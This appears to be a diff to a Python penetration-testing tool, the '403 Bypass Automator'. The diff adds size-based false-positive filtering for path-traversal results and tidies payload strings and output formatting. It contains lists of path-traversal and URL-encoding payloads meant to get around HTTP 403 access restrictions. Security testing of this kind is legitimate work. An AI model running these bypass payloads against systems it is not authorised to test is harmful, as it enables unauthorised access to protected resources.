@@ -22,7 +22,9 @@ class BypassAutomator:
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         })
         self.original_status = None
+        self.original_size = None
         self.successful_bypasses = []
+        self.traversal_sizes = {}  # Track sizes of traversal responses to detect false positives
         
     def test_request(self, test_url, method='GET', headers=None, description=''):
         """Test a single request and return status code"""
@@ -68,11 +70,11 @@ class BypassAutomator:
         else:
             bypass_status = ""
         
-        # Format: [BYPASSED]/[NOT BYPASSED] [tag] [severity] target - description
+        # Format: [BYPASSED]/[NOT BYPASSED] [tag] target - description
         if status:
-            print(f"{bypass_status} {Fore.CYAN}[{tag}]{Style.RESET_ALL} [{color}{severity.upper()}{Style.RESET_ALL}] {target} - {description} [{status}] [{size} bytes]")
+            print(f"{bypass_status} {Fore.WHITE}[{tag}]{Style.RESET_ALL} {target} - {description} [{status}] [{size} bytes]")
         else:
-            print(f"{Fore.CYAN}[{tag}]{Style.RESET_ALL} [{color}{severity.upper()}{Style.RESET_ALL}] {target} - {description}")
+            print(f"{Fore.WHITE}[{tag}]{Style.RESET_ALL} {target} - {description}")
         
         if extra_info:
             for key, value in extra_info.items():
@@ -82,12 +84,41 @@ class BypassAutomator:
         """Test original URL to get baseline"""
         status, size = self.test_request(self.url)
         self.original_status = status
+        self.original_size = size
         if status == 403:
             self.print_nuclei_style('403-bypass', 'info', self.url, 'Original request returns 403', status, size)
         else:
             self.print_nuclei_style('403-bypass', 'info', self.url, f'Original request returns {status}', status, size)
         print()
         return status == 403
+    
+    def is_suspicious_traversal(self, payload, status, size):
+        """Detect if a path traversal is likely a false positive (going to root instead of bypassing)"""
+        if status != 200:
+            return False
+        
+        # Check if payload contains path traversal patterns
+        traversal_patterns = ['/../', '/../../', '/../../../', '..%2F', '%2e%2e', '..;', '/..//']
+        is_traversal = any(pattern in payload for pattern in traversal_patterns)
+        
+        if not is_traversal:
+            return False
+        
+        # If size is very different from original (especially much smaller), likely false positive
+        if self.original_size and size < self.original_size * 0.5:
+            return True
+        
+        # Track traversal sizes - if multiple traversals give same size, likely all going to same place (root)
+        size_key = f"traversal_{size}"
+        if size_key not in self.traversal_sizes:
+            self.traversal_sizes[size_key] = []
+        self.traversal_sizes[size_key].append(payload)
+        
+        # If 3+ different traversals give same size, likely false positive
+        if len(self.traversal_sizes[size_key]) >= 3:
+            return True
+        
+        return False
     
     def test_url_encoding_bypasses(self):
         """Test URL encoding bypasses"""
@@ -279,8 +310,8 @@ class BypassAutomator:
             # Path traversal variations
             ('..;', 'Dots semicolon'),
             ('..;/', 'Dots semicolon slash'),
-            ('..\;', 'Dots backslash'),
-            ('..\;/', 'Dots backslash slash'),
+            (r'..\;', 'Dots backslash'),
+            (r'..\;/', 'Dots backslash slash'),
             ('/..%3B/', 'Encoded semicolon traversal'),
             # Special characters
             ('~', 'Tilde'),
@@ -301,7 +332,7 @@ class BypassAutomator:
             ('?param', 'Param query'),
             ('?testparam', 'Test param query'),
             # Special paths
-            ('\/\/', 'Escaped slashes'),
+            (r'\/\/', 'Escaped slashes'),
             ('debug', 'Debug'),
             ('false', 'False'),
             ('null', 'Null'),
@@ -350,6 +381,11 @@ class BypassAutomator:
                 status, size = self.test_request(test_url, description=description)
                 
                 if status:
+                    # Check if this is a suspicious traversal (false positive)
+                    if self.is_suspicious_traversal(payload_str, status, size):
+                        # Don't report as bypass, likely going to root
+                        continue
+                    
                     if status == 200:
                         self.print_nuclei_style('403-bypass', 'vulnerable', test_url, description, status, size, {'technique': 'path-traversal', 'payload': payload_str})
                         self.successful_bypasses.append((test_url, description, status, size, 'path-traversal', payload_str))
@@ -818,7 +854,7 @@ class BypassAutomator:
             ('/*', 'Wildcard'),
             ('./.', 'Current dir dot'),
             ('/*/', 'Wildcard slash'),
-            ('\..\.\\', 'Backslash dots backslash'),
+            (r'\..\.\\', 'Backslash dots backslash'),
         ]
         
         for payload, description in extended_encoding:
@@ -826,6 +862,11 @@ class BypassAutomator:
             status, size = self.test_request(test_url, description=description)
             
             if status:
+                # Check if this is a suspicious traversal (false positive)
+                if self.is_suspicious_traversal(payload, status, size):
+                    # Don't report as bypass, likely going to root
+                    continue
+                
                 if status == 200:
                     self.print_nuclei_style('403-bypass', 'vulnerable', test_url, description, status, size, {'technique': 'extended-encoding', 'payload': payload})
                     self.successful_bypasses.append((test_url, description, status, size, 'extended-encoding', payload))
@@ -972,7 +1013,7 @@ class BypassAutomator:
             ('-', 'Dash'),
             ('.', 'Dot'),
             ('..;', 'Dots semicolon'),
-            ('..\;', 'Dots backslash'),
+            (r'..\;', 'Dots backslash'),
             ('..;/', 'Dots semicolon slash'),
             ('~', 'Tilde'),
             ('°/', 'Degree slash'),
@@ -992,7 +1033,7 @@ class BypassAutomator:
             ('?param', 'Param query'),
             ('?testparam', 'Test param query'),
             # Special paths
-            ('\/\/', 'Escaped slashes'),
+            (r'\/\/', 'Escaped slashes'),
             ('debug', 'Debug'),
             ('false', 'False'),
             ('null', 'Null'),
@@ -1098,15 +1139,15 @@ class BypassAutomator:
             ('..;%0d/', 'Dots semicolon carriage return'),
             ('..;%ff/', 'Dots semicolon FF byte'),
             ('..;/', 'Dots semicolon slash'),
-            ('..;\;', 'Dots semicolon backslash'),
+            (r'..;\;', 'Dots semicolon backslash'),
             ('..;\\', 'Dots semicolon backslash'),
-            ('..\;', 'Dots backslash'),
+            (r'..\;', 'Dots backslash'),
             ('..\\', 'Dots backslash'),
             ('./', 'Current slash'),
             ('./.', 'Current dot'),
             ('.//./', 'Complex current'),
             ('.;/', 'Current semicolon'),
-            ('.\;/', 'Current backslash semicolon'),
+            (r'.\;/', 'Current backslash semicolon'),
             ('.html', 'HTML extension'),
             ('.json', 'JSON extension'),
             # Path variations
@@ -1279,7 +1320,7 @@ class BypassAutomator:
             ('?', 'Question'),
             ('??', 'Double question'),
             ('???', 'Triple question'),
-            ('\..\.\\', 'Backslash dots backslash'),
+            (r'\..\.\\', 'Backslash dots backslash'),
         ]
         
         # Insert payloads between segments
@@ -1339,14 +1380,12 @@ class BypassAutomator:
 def print_banner():
     """Print tool banner"""
     banner = f"""
-{Fore.CYAN}================================================================
-{Fore.CYAN}
-{Fore.CYAN}                    HAVE ACCESS NOW?
-{Fore.CYAN}
-{Fore.CYAN}        403 Bypass Automator - Test 1000+ bypass techniques
-{Fore.CYAN}                    Created by d0x
-{Fore.CYAN}
-{Fore.CYAN}================================================================{Style.RESET_ALL}
+{Fore.RED}
+                    HAVE ACCESS NOW?
+
+        403 Bypass Automator - Test 1000+ bypass techniques
+                    Created by d0x
+{Style.RESET_ALL}
 """
     print(banner)
 
